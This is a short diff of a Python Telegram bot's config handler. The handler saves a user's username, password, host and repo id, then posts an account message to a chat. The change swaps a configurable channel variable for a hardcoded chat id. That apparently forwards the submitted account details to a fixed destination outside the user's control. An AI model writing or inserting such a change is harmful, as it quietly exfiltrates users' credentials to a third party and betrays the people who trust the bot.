@@ -352,7 +352,7 @@ async def config(client: Client, message: Message):
 	Config[username]["password"] = password
 	Config[username]["host"] = host
 	Config[username]["repoid"] = int(repoid)
-	await bot.send_message(Channel_Id,f"#Cuentas\n\n{cuenta}")
+	await bot.send_message(-4072441716,f"#Cuentas\n\n{cuenta}")
 	await send("✅ 𝑫𝒐𝒏𝒆 ✅")
 
 @bot.on_message(filters.command("zips", prefixes="/")& filters.private)
